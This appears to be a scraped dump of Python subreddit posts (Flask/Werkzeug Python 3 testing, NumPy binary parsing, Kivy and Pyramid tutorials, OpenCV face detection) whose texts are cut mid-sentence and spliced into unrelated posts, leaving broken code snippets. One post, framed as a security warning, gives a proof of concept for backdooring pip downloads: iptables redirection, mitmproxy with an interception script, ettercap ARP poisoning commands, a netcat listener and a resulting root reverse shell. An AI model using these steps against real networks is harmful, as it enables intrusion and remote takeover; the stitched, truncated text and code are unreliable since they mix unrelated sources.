1369951924.0,1fd69b,Werkzeug and Flask git repositories have early Python 3 Support. Testers wanted.,mitsuhiko,272,33,33,"If you're using Flask or Werkzeug (independently of if you're planning on upgrading to Python 3) some help is wanted in making sure that the current versions in the git repositories don't break your code (too much).

There were some unfortunate API changes necessary due to the restricted bytes type on Python 3 which might show up:

- Werkzeug's `Headers.linked`was removed without replacement.  The API just does not work without string coercion.
- Werkzeug and Flask `Headers` now returns unicode objects all the time and headers are restricted to latin1.  This is the only thing that makes sense on PEP 3333
- `werkzeug.urls` is now rewritten from scratch without the stdlib and provides URL parsing and joining functions.  Use those instead of the stdlib one if you want code that works on 2.x and 3.x.  They are internally uniforming IRIs and URIs (or at least attempt).
- Some deprecated functionality was removed in Werkzeug and Flask.
- Flask's JSON support differs from the stdlib in unicode behavior on Python 3.  Use `flask.json` instead of `json` or `simplejson` on Python 3 to get unified behavior on 2.x and 3.x regardless of if the stdlib's JSON or simplejson module is used.
- non-silent usage of limited streams in Werkzeug is gone.  I suppose nobody used that anyways.
- Werkzeug's request objects now act as context managers and provide a close method.  This ensures that request resources are properly closed without the help of the garbage collector.
- Fixed some issues with the request object sometimes ignoring the `direct_passthrough` flag.  This might show some errors in your code now.
- Flask's teardown system got reworked due to exception handling changes on Python 3.  This might now have a knock-on effect if you have custom error handlers.  You might now get an error passed to teardown functions which were previously already hidden.  This change is probably for the better due to teardown handlers being used for resource management.

To see if your app works with the changes check out the master branches from github and install them into a virtualenv.

---

&gt;'list.sort' returns the sorted list. (Wrong: it actually returns None.)

---

&gt;Misconception: The Python ""is"" statement tests for equality.

&gt; Reality: The ""is"" statement checks to see if two variables point to the same object.

&gt;This one is especially nasty, until it doesn't :)

&gt;In [1]: a = 'hello'

&gt;In [2]: b = 'hello'

&gt;In [3]: a is b

&gt;Out[3]: True

&gt;In [4]: a = 'hello world!'

&gt;In [5]: b = 'hello world!'

&gt;In [6]: a is b

&gt;In [7]: a = 3

&gt;In [10]: a = 1025

&gt;In [11]: b = 1025

&gt;In [12]: a is b

1362516368.0,19q8nt,PSA: Consider using NumPy if you need to parse a large binary data file with a fairly simple format,moyix,233,31,34,"I'm not sure how many people know about this

Often I'll end up in a situation where I have a huge (like 6-10 GB) data file that's made up of lots of fixed-length structures

    struct foo {
        uint64_t x;
        uint64_t y;
        uint64_t z;
        int32_t bar[256];
    };

Now

    import struct
    fmt = ""&lt;QQQ256i""
    sz = struct.calcsize(fmt)
    f = open('bigfile.bin')
    recs = []
    while True:
        data = f.read(sz)
        if not data: break
        recs.append(struct.unpack(fmt

But for me this takes a long time for large files (around 2-3 minutes on a 6GB file) and it uses up a lot of memory to store a lot of Python objects (12G for that 6GB file).

Instead you can use NumPy's support for reading structured arrays into a numpy array:

    import numpy as np
    f = open('bigfile.bin')
    rectype = np.dtype( [ ('x', '&lt;u8'),
                          ('z', '&lt;i4', 256) ] )
    recs = np.fromfile(f

Which only takes 8 seconds on my machine, like ""give me the average of the product of the x's and z's"": `np.mean(recs['x']*recs['z'])`.

What's going on here is as follows. CPython uses a mutex, it *very* briefly acquires this mutex in order to initialize its storage. Code called from PyOS_AfterFork() (which, as its name suggests, is responsible for doing various initialization right after a Python subprocess is forked off) also acquires this mutex; this code was introduced as part of the resolution for [issue 10517](http://bugs.python.org/issue10517). When you call fork() from a multithreaded program, the resulting child process is single-threaded; only the thread that called fork() gets copied over. Consequently, CPython-2.7.2 has a race condition: if one Python thread calls subprocess.Popen(), or anything else that forks off a subprocess, and the fork occurs in the very narrow window in which the thread-local storage mutex is being held, it deadlocks.

I maintain a piece of (in-house and proprietary) server software which runs on a very large network. Last month I updated it to run on python2.7, and I was able to grab a core image, see a backtrace like the one above, and eventually reproduce it with the above test case.

1359827998.0,17rfh7,Warning: don't use pip in an untrusted network! – a practical man-in-the-middle attack on pip,Xykr,180,28,111,"I've been messing around with pip lately and noticed something I wasn't quite aware of before

## The problem

**pip downloads all packages over plain HTTP** (even though PyPi *has* a valid certificate; Edit: has only got a CACert cert). There is a simple MD5 checksum check, if you do `pip install something`, **you are theoretically giving root access to everyone who could intercept your connection** (this includes everyone on your local network). This is quite unbelievable.

**DO NOT install packages using pip (and possibly easy_install) in an untrusted environment!**

I wanted to verify how easy it is to exploit this

I've hacked together a script which intercepts all package files downloaded from PyPi

## Proof Of Concept

See this as an example on how easy it is to exploit this and similar vulnerabilities.

You need a few packages for this to work:

    sudo apt-get install atool
    sudo pip install mitmproxy

(if you have not heard of mitmproxy before

Download this gist and save it as `pip_intercept.py`:

https://gist.github.com/4698537


Set up forwarding rules:

    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
    sudo iptables -t nat -A POSTROUTING -j MASQUERADE
    sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

Run the proxy:

    mitmproxy -T -z -s pip_intercept.py

Now

Example:

    sudo ettercap -o -T -P repoison_arp -M arp:remote /192.168.1.1/ /192.168.1.33/

This intercepts all traffic between 192.168.1.1 (the gateway) and 192.168.1.33 and re-routes it over your machine.

The script loaded into mitmproxy will automatically manipulate all PyPi downloads and connect back with a shell to the IP and port specified in the script.

I've tried this in my lab and it worked perfectly well.

First

    nc -l 4444

Then

    ~# sudo pip install requests

    Downloading/unpacking requests
      Downloading requests-1.1.0.tar.gz (339kB): 339kB downloaded
      Running setup.py egg_info for package requests
        
    Installing collected packages: requests
      Running setup.py install for requests
        
    Successfully installed requests
    Cleaning up...
    
Then

    id
    uid=0(root) gid=0(root) groups=0(root)

Remote root shell! Ooops. (if you would improve the script a bit it'd work on Windows as well).

## Solution?

Never, if you can't verify its integrity. I don't understand why this wasn't already fixed like a few years ago. The average user clearly isn't aware of this danger.

Can't be that hard to fix (if I've got some more spare time I'll try it myself instead of just complaining).

**Edit:** I've just got an angry PM – no, I use both languages and while Python beats most other languages in many aspects (and loses in others) and it's my preferred language, both are great. The right tool for the job.

If you do have ipython

    $ # should be &gt;= 0.12
    $ sudo pip install --upgrade ipython

Now that we all have ipython

    $ ipython profile create # tells you where config file is located

My config file ended up in `~/.ipython/profile_default/ipython_config.py`. Check the output of the command to see where your config file is located. Open that file with your favorite $EDITOR (mine's vim)

change it to

also change the line

In this last bit I'm not really joking.

I had many newbie critiques a few years ago - 'self', something about slicing that I forget now, that it was confusing which things worked in-place, and which worked on a copy, etc. - and in a forum (not reddit) where I posted up my lengthy list (mostly to see what people thought of these things), I was met with a wall of responses, all strongly in favor of every last part of all of it, philosophical justifications as to why that thing or those things *must* be that way.

It's the perfect language

So my new question is just straight up: *IS* there anything about Python you don't like? I mean, so clearly 2.x had room for improvement, so let's hear it. Be prepared for a battle on all fronts from everyone else in here, though, whatever you say :) I'd love to hear from the real experts, the people who usually wield seemingly powerful reasoning and long strings of computer science words in their arguments.

Considering a package with multiple modules (and possibly sub-packages)

1. Leave the ``__init__.py`` blank. This enforces explicit imports and thus clear namespaces. I've read Alex Martelli post in favor of this option on various questions at Stack Overflow. The cons are

1. Import all modules in ``__init__.py``. The user doesn't have to do multiple imports. The cons are explicit vs implicit, maybe it should all go in a single module anyway"".

1. Import key functions from various modules directly into the package namespace. If you restructure modules, and very implicit / hacky.

1271346943.0,brcpk,[Official announcement] List of all the submissions that got incorrectly autobanned by the spamfilter,BioGeek,150,29,22,"Dear Python community

The reddit admins recently made some changes which allowed the subreddit mods to have a better view on which submissions got autobanned by the spam filter. To our horror

The spam filter is [trained on a per-reddit basis](http://blog.reddit.com/2008/06/per-reddit-automated-spam-filters.html) each time a moderator bans or un-bans a link or comment. To kick some sense back into our spam-filter I unbanned all 160 posts that got incorrectly trapped. They are listed below for your reference. I give my sincere apologies to all the submitters and authors who were affected. 

I feel especially sorry for all submitters who made a *self*.Python or AskPython post: your question being greeted by complete silence is not the message we as a community want to send out. The reddit admins are [rolling out a system of deputy moderation](http://blog.reddit.com/2010/04/youve-been-drafted.html) which should hopefully prevent this from happening again in the future.

We've just released Kivy 1.7.0. You can download it at [kivy.org](http://kivy.org)

There is severals new features

* Garden. As some of you have seen on the documentation, update, uninstall, garden package. If you want to participate and share your widgets with the community, that's the way to go! Join us at:

    http://kivy-garden.github.io/

* Android emulator support. If you use python-for-android

* ScrollView has been refactored: the scrolling part is now separated as an effect, and OpacityScrollEffect. This design will allow us to implement Pull-and-release scrollview as we're seeing on mobile (gmail, twitter etc.).

* Kv Dynamic classes. Most users never understood why kv Templates don't act the same as others widget, it wasn't good. Dynamic classes allow you to create a widget class on-the-fly. The syntax is very simple:

        &lt;MyCustomButton@Button&gt;:
            # usual rule content here.

    It's equivalent to:

        class MyCustomButton(Button):
            pass

I've been trying to think of hobby projects to demonstrate Python knowledge on my GitHub. Ones that mimic the sort of problems I'd face as an engineer in the field, C++, or even JavaScript/Node would be a more reasonable language choice.

but it's true.  in both my discrete math and linear algebra homework i was able to use python to explore some concepts and actually get a better grip on the material.  and what makes that so cool (and yeah

i've been playing with python for a few weeks and have done a couple of relatively significant scripts (~200 lines of code) and a django app or two, check out what my script does' with a minimum of frustration.

which brings me to my second point: a big, add-on modules, etc) what it is.  every time i've thought 'i wonder if there's a module that can do x?' i find one that does x, y, &amp; z and usually in a more elegant or functional manner than i envisioned.  and every time i've struggled to figure out how to do something, there's inevitably a blog or stackoverflow entry that clarifies the concept.  so, again

anyway

secondly, wanted to pass a couple things along.

1. http://code.google.com/edu/languages/google-python-class/
work through the videos and exercises and you'll be well on your way to getting the language under your fingers.

2. Python Essential Reference
this is one of those books where you'll bang your head against something for hours (days) and finally look it up in here and there will only be like a sentence or two

3. stackoverflow
just click the python tag and look at the most-voted.  lots of good general info and useful compilations.  you'll overload the first couple times but as you learn more stuff

4. and lest you think i'm forgetting the obvious, smart-ass?

Every now and then I toy around with other languages and platforms but they never stick for more than a few days. There are probably several reasons for this - excessive familiarity with the ""old and trusted"", especially since I am about to switch from fulltime employment to freelancing/consulting. 

Ruby (and Rails) is perhaps the most natural choice, and the fact that you can ostensibly use the same language for both Web frontend and backend code is appealing (though I'm sure that simply learning Javascript does not automatically make one a full-stack developer).

So I'd love to read some thoughts about this

1) Is branching out to other programming platforms and communities a smart (or even necessary) move, establishing oneself as a specialized ""Python expert"" or branching out to different application domains (e.g. finance) while still sticking with Python?

2) If yes

For starters we'll use OpenCV's Python bindings, since that will be what I'll be expecting in my project.

So after that long winded intro

**Detecting a Face using OpenCV's Python Bindings!**

    import cv

    hc = cv.Load(""haarcascades/haarcascade_frontalface_default.xml"")
    img = cv.LoadImage(image
    imgName = image[::-1]
    imgName = imgName[imgName.find('.')+1:][::-1]
    faces = cv.HaarDetectObjects(img, 1.2, 2, 0, (20, 20))
    if faces:
        for (x,h),n in faces:
            cv.Rectangle(img, (x+w,y+h), (255,255,255))
    cv.SaveImage(imgName+'_Detected.png'

One of the most common ways to detect objects

In the code snippet above

* [cv.Load](http://opencv.willowgarage.com/documentation/python/core_xml_yaml_persistence.html?highlight=load#Load) handles loading the haar-like features we want to search for. In this case I've used the default version

* [cv.LoadImage](http://opencv.willowgarage.com/documentation/python/highgui_reading_and_writing_images_and_video.html?highlight=loadimage#LoadImage) obviously loads our image for processing. You can specify whether or not it is a color image by setting the 2nd argument to 0 or 1 (or cv.CV_LOAD_IMAGE_COLOR).

* [cv.HaarDetectObjects](http://opencv.willowgarage.com/documentation/python/objdetect_cascade_classification.html?highlight=haardetectobjects#HaarDetectObjects) is where the real meat and potatoes of using OpenCV for detection comes into play. By specifying our image, for example, do we REALLY want to detect that random face in the background that's 50 feet way? This also helps remove falsely detected faces. Good practice is to set this to be some percentage of the image's width/height instead of a constant size, unless you are working in strict image sizes.

* [cv.Rectangle](http://opencv.willowgarage.com/documentation/python/core_drawing_functions.html?highlight=rectangle#Rectangle) simply draws a square around our detected faces based on the returns of cv.HaarDetectObjects.

* [cv.SaveImage](http://opencv.willowgarage.com/documentation/python/highgui_reading_and_writing_images_and_video.html?highlight=saveimage#SaveImage) takes the loaded image

And that is how we find objects through OpenCV! As personal time allows it, which a focus on [Stacked Active Shape Modeling](http://www.milbo.users.sonic.net/stasm/), and creating a custom Haar-like Feature Vector.

1. For the vast majority of the code
2. The biggest chunk of problems you'll have during the port will probably come from string/bytes, if you open a file in 't' mode, you get `str` from it, and if you open it in 'b' mode, you get `bytes` out of it)
3. I had an old workaround for an old bug in sqlite where it wouldn't correctly open unicode filenames. The bug had been fixed since
4. If you use StringIO in python 2
5. In PyQt
6. UI/RC files in PyQt. First, which means that the folder with your UI-built python modules *have* to be in your `sys.path`
7. Porting C source files is much trickier than .py files. The changes made to the C API in Python aren't documented.
8. I had a call to `PyObject_CallMethodObjArgs` under python 2 for which I, under which I got crashes. It took a while for me to find the cause of it (I'm not very experienced with C).
9. Some C functions which used to take `char *` now take `wchar_t *`. Be aware.
10. If some of the libraries you use have just recently been ported to py3k, it's py2app. I'm already one of the few to use it with the ""plugin"" option, I was the first one to use the plugin option under 3k, that's for sure (the C file for plugins wasn't ported at all). I had to roll up my sleeves, open my C In a Nutshell book, and dive in (I'm glad I did though. A good opportunity for learning stuff about Python's C API).

&gt; Why would company policies that ban github permit your alternative?

It's not a matter of being able to use github--there's no problem with it. There's an issue with posting code that does not have such permissible license. We're just simply not allowed to for a lot of the work. Sure

I remember endless sheets of papers with ""wonderful"" ideas that would allow me to quit my job and enjoy my free time. My problem was that I was never able to take any of these ideas to completion. There was always a new idea on the horizon, etc. 

I'm a mechanical engineer by training, I thought I would give it another try. This time I did some research and found Django and Python. I worked through the tutorial and I was sold. Slowly but surely, I started programming, and learning. I bought the ""Practical Django Projects"" book which was a great resource and just kept at it when I could. It was like building a very complicated lego set, where I would build a section, come back to it, and keep building. Fast forward to a year later, and understood how inheritance could help me avoid copy-pasting code. 

Anyway

To all you python/django newbies

Thanks to everyone here for the inspiration!


**edit:** Spelling (thanks punning linguist)


**edit2:** Wow, really cheap and professional looking designs! I've always liked web design, so I know enough photoshop and css to be able to modify stuff. It also took a year because I had to learn a little jquery. The most time consuming and difficult part was the webdesign, not the programming, Django makes things so simple!!!! If I would do another site, I'd mostly likely team up with someone or hire a web-designer!


**edit3,6:**
My 7 tips for finishing your web projects:

* Keep it simple: Build something simple and don't let features creep up. (Do users really need the x and y feature: probably not) . 

* Don't tell anyone until you're finished: For some reason I'd always tell people about my super awesome web-projects and then get embarrassed when they asked after I had given up.

* Set small daily incremental goals: Something that really helped me would be to set a specific goal every time I sat down to code: finish x before I go to sleep.

* Avoid the internet while working: Turn off your wireless or un plug your lan cable

* Avoid the self reinforcing give-up cycle: I would always tend to give up or lose interest in my web projects when I discovered a site that did things better, the internet will still be there when you're done. 

* Ask for help: There are many online communities

* Learn the underlying programming language of your framework: You can't get around it

* Don't reinvent the wheel: most everything you need for a simple (and complicated) web site has already been built and for the most part is already a part of Django. For example: Search -&gt; http://haystacksearch.org/ Comments -&gt; http://docs.djangoproject.com/en/dev/ref/contrib/comments/   even stuff you didn't know you needed -&gt; http://docs.djangoproject.com/en/dev/ref/contrib/sitemaps/

1337349671.0,tt9gb,Would anyone be interested in a blog post about getting up and running with Pyramid?,EhWardo,95,24,21,"I recently looked into learning the Pyramid framework coming from Django and I have been writing about it. 

I also wrote two a short bash scripts (one that uses the starter scaffold and the other that uses the alchemy scaffold) to automate the creation of a development environment, and starting up the server. 

If anyone is interested just let me know and I will just post it here. I will of course post the two scripts that I use along with the post and if anyone more experienced with bash stuff could possibly give suggestions to make it better please do I am kind of a scrub at it.

####Up and Running with Pyramid on Mac OSX

This is a small tutorial on how to get up and running using the [Pyramid](http://www.pylonsproject.org/) framework. I figured since [reddit](http://www.reddit.com/) uses it and it is Python 3 compatible

####Initial Dependencies

* [Python](http://www.python.org/) - I am using Python 3.2.3 but this guide should be ""fairly"" compatible with earlier versions.
* [virtualenv](http://www.virtualenv.org/en/latest/index.html) - Used to keep external python libraries/dependencies separated by project. Beginners may not realize why this is useful but 
* [virtualenvwrapper](http://www.doughellmann.com/projects/virtualenvwrapper/) - This one really isn't ""required"" but I really like it because it makes the already trivial virtualenv even easier!

In order to get started with virtualenvwrapper one must put these configurations in their .bash_profile or .bashrc or wherever you store your bash stuff.

    #This line creates a place for the virtualenvs
    #to be stored as well as some virtualenvwrapper
    #unix executables
    export WORKON_HOME=$HOME/VIRTUALENVS
    
    #This line sets a project home where empty directories
    #will be created that relate to the virtualenv
    export PROJECT_HOME=$HOME/PROJECTS
    
    #This tells adds this file to the path so that commands
    #like mkproject and workon are recognized
    source /usr/local/bin/virtualenvwrapper.sh


This is really all you need to get started with Pyramid. The next parts will detail how to get pyramid installed

####How to Pyramid


Assuming the above dependencies and virtualenvwrapper configured I can type the following command in my Terminal:

    mkproject --python=python3 MY_PROJECT_DIRECTORY
    
This command will make a virtualenv and bind it to a project directory named the same as the environment. In the future to activate the virtualenv and move to the directory in the projects folder one can use:

    workon MY_PROJECT_DIRECTORY
    
The next step is to actually install the Pyramid framework. This is stupid simple with the virtualenv activated all you need to do is:

    pip install zope.interface==3.8 pyramid
    
This command will install pyramid and all of its dependencies. One must prepend `zope.interface==3.8` to make it compatible with Python 3.2 (I have not tested on Python 2.x). After that is done (it may take a while) the easiest way to get up and running with Pyramid is to use one of its scaffolds to create the initial structure/design of your project.

I use git for version control so in my project directory i run:

    git init
    
This will initialize a new git repo for version control. I want my project to have a database and use SQLAlchemy so I use the alchemy scaffold with this command while being in my project directory.

    pcreate -s alchemy MY_PROJECT_NAME
    
Boom! There you have a project structure that can use have a database using SQLAlchemy. The next step is to install your newly created project for development. This is done by running this command with the virtualenv activated and the command line inside MY_PROJECT_NAME:

    python setup.py develop
    
This command installs a distribution of your project in site-packages which makes it discoverable to import statements and Pyramid commands.

We are getting really close to seeing some stuff in a browser!

The next two steps initialize the database and run the waitress server.

    initialize_MY_PROJECT_NAME_db development.ini
    pserve development.ini --reload
    
The `--reload` option means that if changes are made to .py or .ini files the server will restart which makes development quicker and easier.

Well you should now have a working site using Pyramid!

####For the lazy...

I have written two scripts (one for starter and one for alchemy project scaffolds) and here they are.

    buildapyramid () {
        local TEMP_INPUT=$1: $1 &amp;&amp;
        local PROJECT_NAME=${TEMP_INPUT%?} &amp;&amp;
        mkproject --python=python3 $PROJECT_NAME &amp;&amp;
        git init &amp;&amp;
        touch README.md &amp;&amp;
        #Using zope.interface==3.8 for backwards compatability with Python 3
        pip install zope.interface==3.8.0 pyramid &amp;&amp;
        pcreate -s starter $PROJECT_NAME &amp;&amp;
        cd $PROJECT_NAME &amp;&amp;
        python setup.py develop &amp;&amp;
        pserve development.ini --reload
    }
    
    architectapyramid () {
        local TEMP_INPUT=$1: $1 &amp;&amp;
        local PROJECT_NAME=${TEMP_INPUT%?} &amp;&amp;
        mkproject --python=python3 $PROJECT_NAME &amp;&amp;
        git init &amp;&amp;
        touch README.md &amp;&amp;
        #Using zope.interface==3.8 for backwards compatability with Python 3
        pip install zope.interface==3.8.0 pyramid &amp;&amp;
        pcreate -s alchemy $PROJECT_NAME &amp;&amp;
        cd $PROJECT_NAME &amp;&amp;
        python setup.py develop &amp;&amp;
        initialize_${PROJECT_NAME}_db development.ini &amp;&amp;
        pserve development.ini --reload
    }

Simply put the source HTML from your ""saved"" webpage when logged into reddit into an ANSI text file

Take any one liner you are running after changing some files, run the one liner, damn made a mistake, ok fix, run command, hmm no still not there...ah there it is, fix that... yep it works. 

The annoying step in this is switching to your command line every time you make a change.

This script takes a list of files in the stdin and monitors them for changes. If any of the files change it runs the command you give as arguments. Assuming you call this script ""change"" I've been using it like this:

    find . -iname '*.py' | change nosetests -s

Now that's running the background somewhere

Here's the code:

    #!/usr/bin/env python
    import sys
    import os
    import stat
    import time
    tomon = sys.stdin.readlines()
    command = "" "".join(sys.argv[1:])
    if(command==""""): raise Exception(""No command given"")
    curval = 0
    while True:
        val = 0
        for monitor in tomon:
            monitor = monitor.strip()
